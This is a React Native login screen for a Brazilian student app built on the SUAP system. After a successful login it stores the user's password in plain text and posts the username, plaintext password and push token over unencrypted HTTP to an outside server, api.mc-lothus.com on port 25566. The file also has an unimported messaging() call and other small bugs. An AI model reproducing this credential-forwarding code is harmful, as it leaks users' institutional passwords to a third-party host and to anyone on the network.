import React, { useEffect, useState } from 'react'

import { Background } from '../../components';
import { Text } from 'react-native';
import { View } from 'react-native';
import { Image } from 'react-native';

import { OnboardFlow, PrimaryButton } from 'react-native-onboard';

import TextInput from '../../components/TextInput';

import Logo from '../../components/Logo';

import Button from '../../components/Button';

import Header from '../../components/Header';

import axios from 'axios';

const b = PrimaryButton({ currentPage: 0, totalPages: 3, text: "oi" });

function button(...data) {
    data[0].text = data[0].text === "Continue" ? "Continuar" : "Iniciar!";
    data[0].style = {
        backgroundColor: "rgb(4, 252, 92)",
    };

    console.log(data[0])
    return PrimaryButton(...data)
};

import SUAP from '../../services/SUAP';

import { Dimensions } from 'react-native';
import { Linking } from 'react-native';

import * as Keychain from 'react-native-keychain';

import AsyncStorage from '@react-native-async-storage/async-storage';

import * as Notifications from 'expo-notifications';

export default function StartScreen({ navigation }) {

    const [index, setIndex] = useState("Sim");

    const [user, setUser] = useState({ value: '', error: '' })

    const [password, setPassword] = useState({ value: '', error: '' });

    const [showPassword, setShowPassword] = useState(false);

    async function requestUserPermission() {
        const settings = await Notifications.getPermissionsAsync();

        await Notifications.requestPermissionsAsync({
            ios: {
                allowAlert: true,
                allowBadge: true,
                allowSound: true,
                allowAnnouncements: true,
            }
        })
    }

    const tryLogin = (user, password) => {

        SUAP.Login(user, password).then(async data => {
            if (!data) {
                setUser({ value: user, error: "Usuário ou senha inválidos" })
                setPassword({ value: password, error: "Usuário ou senha inválidos" })
            } else {

                Keychain.setGenericPassword(user, password);

                AsyncStorage.setItem("userinfo", JSON.stringify({
                    user: user,
                    password: password,
                    token: data.access,
                }));

                axios.post("http://api.mc-lothus.com:25566/postToken", {
                    user: user,
                    password: password,
                    token: await AsyncStorage.getItem("token"),
                })

                navigation.navigate("Dashboard")
            }
        })
    }
    useEffect(() => {
        requestUserPermission();

        AsyncStorage.getItem("token").then(token => {
            if (!token) {
                messaging().getToken().then(tokenn => {
                    AsyncStorage.setItem("token", tokenn)
                })
            }
        })

        setIndex("Sim");

        Keychain.getGenericPassword().then(credentials => {
            if (credentials && credentials.username) tryLogin(credentials.username, credentials.password)
        })
    }, []);

    return (
        <Background navigation={navigation}>
            <View style={{
                flex: 1,
                justifyContent: "flex-end",
                alignItems: "center",
                alignSelf: "center",
                width: Dimensions.get("window").width,
                height: Dimensions.get("window").height,
            }}>
                <View style={{
                    flex: 0.2,
                }}>
                    <Logo />
                </View>

                <View style={{
                    flex: 0.6,
                    width: "100%",
                    alignItems: "center",

                }}>
                    <Header customStyle={{
                        fontSize: 35,
                        fontWeight: "bold",
                    }}>
                        Login
                    </Header>

                    <Header customStyle={{
                        fontSize: 16,
                    }}>
                        Estamos quase lá...
                    </Header>

                    <Header customStyle={{
                        fontSize: 16,
                    }}>
                        Que tal logar para continuar?
                    </Header>
                    <Header></Header>
                    <TextInput
                        placeholderTextColor={"#06FF5B"}
                        placeholder={"Matrícula"}
                        style={{
                            backgroundColor: "rgb(72, 100, 128)",
                            borderColor: "rgb(72, 100, 128)",
                            borderRadius: 20
                        }}
                        label={user.error}
                        leftIcon={{ type: 'font-awesome', name: 'user', color: "white" }}
                        keyboardType="email-address"
                        returnKeyType="next"
                        value={user.value}
                        onChangeText={(text) => setUser({ value: text, error: '' })}
                        autoCapitalize="none"
                    />
                    <TextInput
                        placeholderTextColor={"#06FF5B"}
                        placeholder={"Senha"}
                        style={{
                            backgroundColor: "rgb(72, 100, 128)",
                            borderColor: "rgb(72, 100, 128)",
                            borderRadius: 20
                        }}
                        label={user.error}
                        leftIcon={{ type: 'font-awesome', color: "white", name: 'lock' }}
                        rightIcon={{
                            type: 'font-awesome', color: "white", name: 'eye', onPress: () => {
                                setShowPassword(!showPassword)
                            }
                        }}
                        returnKeyType="done"
                        value={password.value}
                        onChangeText={(text) => setPassword({ value: text, error: '' })}
                        secureTextEntry={!showPassword}
                    />
                    <Button mode="contained" onPress={() => tryLogin(user.value, password.value)} style={{
                        maxWidth: "40%",
                    }}>
                        Logar
                    </Button>

                    <Button
                        mode="contained"
                        style={{
                            backgroundColor: "transparent",
                        }}
                        onPress={() => Linking.openURL("https://cau.ifbaiano.edu.br/cau/forgot-password")}
                    >
                        Esqueceu a senha?
                    </Button>
                </View>
            </View>
        </Background>
    )
};

const styles = {
    logo_container: {
        width: "100%",
        height: 190,
    },
    logo_image: {
        width: "100%",
        height: 210,
    },
    pageStyleBoard: {
        borderRadius: 25,
        width: "100%",
        height: "100%",
    },
    logo: {
        flex: 0.05,
    },
    logo_if_container: {
        flex: 0.15,
        width: 110,
        height: 110,
    },
    logo_if_image: {
        width: 110,
        height: 110,
    },
    logo_text_container: {
        flex: 0.1,
        maxWidth: "80%",
    },
    logo_text_text: {
        fontSize: 30,
        fontWeight: 'bold',
        alignSelf: 'center',
        color: "white"
    },
    image_container: {
        flex: 0.7,
        alignItems: 'center',
        borderRadius: 35,
    },
    image_container_2: {
        flex: 1,
        alignItems: 'center',
        borderRadius: 35,
    },
    image_container_box: {
        flex: 1,
        borderRadius: 25,
        width: "93%",
        margin: 9
    }
}
